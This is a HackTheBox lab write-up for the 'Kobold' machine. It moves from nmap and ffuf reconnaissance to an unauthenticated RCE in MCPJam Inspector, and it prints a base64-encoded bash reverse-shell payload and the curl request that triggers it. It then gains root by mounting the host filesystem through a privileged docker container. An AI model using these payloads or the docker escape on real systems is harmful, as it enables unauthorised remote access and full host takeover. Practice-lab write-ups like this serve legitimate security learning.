# Kobold — HackTheBox Writeup

<img width="808" height="246" alt="image" src="https://github.com/user-attachments/assets/53b5d317-1923-41b0-8273-751c6ab8f043" />

---

## Reconnaissance

Started with an nmap scan which revealed four open ports:

| Port | Service |
|------|---------|
| 22 | SSH — OpenSSH 9.6p1 |
| 80 | HTTP — nginx 1.24.0 |
| 443 | HTTPS — nginx 1.24.0 |
| 3552 | HTTP — Golang net/http (Arcane 1.13.0) |

Port 80 redirected to `https://kobold.htb/` so I added that to `/etc/hosts`. The main site was just a landing page — "Coming Soon" with a contact email `admin@kobold.htb`. Not much there.

The Arcane instance on port 3552 had no registration endpoint available and default creds didn't work, so I moved on.

---

## VHost Fuzzing — Finding mcp.kobold.htb

The server returned HTTP 200 for all paths, so I used `-ac` to auto-calibrate:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://kobold.htb/ \
  -H "Host: FUZZ.kobold.htb" \
  -ac
```

![ffuf results](https://github.com/user-attachments/assets/698ae520-4efb-44f8-adab-e758d1805295)

This revealed `mcp.kobold.htb` — an MCPJam Inspector instance running version **v1.4.2**.

---

## CVE-2026-23744 — RCE via MCPJam Inspector

MCPJam v1.4.2 is vulnerable to unauthenticated RCE. The `/api/mcp/connect` endpoint passes the `command` and `args` fields directly to the system without any authentication or sanitisation. Since MCPJam binds to `0.0.0.0` by default, this is remotely exploitable.

First I confirmed RCE with a ping test, then got a reverse shell using a base64-encoded payload to avoid escaping issues:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.139/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzkvNDQ0NCAwPiYxCg==
```

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzkvNDQ0NCAwPiYxCg== | base64 -d | bash"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

![Reverse shell](https://github.com/user-attachments/assets/b94db938-3809-4e8f-8c27-4fc536d244ed)

Got a shell as `ben`.

---

## User Flag

```bash
cat /home/ben/user.txt
```

---

## Privilege Escalation — Docker Group

Ran linpeas.sh (uploaded via Python HTTP server) and went down a few rabbit holes — Arcane on port 3552 and a PrivateBin instance on `bin.kobold.htb` — but neither panned out directly.

The key finding was that `alice` is in the `docker` group. Checking `/etc/group` more carefully and running `newgrp docker` revealed ben could switch into the docker group:

```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
docker ps
```

![Docker group](https://github.com/user-attachments/assets/3578d0b8-6c76-4dc9-8db3-3df8beaa5072)

With docker access, the host filesystem can be mounted into a container and chrooted into for a root shell. The `--entrypoint` flag is needed to bypass the default PHP-FPM entrypoint of the only available image:

```bash
docker run -it --rm --privileged -u root \
  --entrypoint /bin/sh \
  -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2 \
  -c "chroot /mnt /bin/bash"
```

Root shell obtained.

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | nmap + vhost fuzzing with ffuf |
| Initial access | CVE-2026-23744 — MCPJam Inspector unauthenticated RCE |
| Foothold | Reverse shell as `ben` |
| Privesc | `newgrp docker` → mount host filesystem → chroot to root |
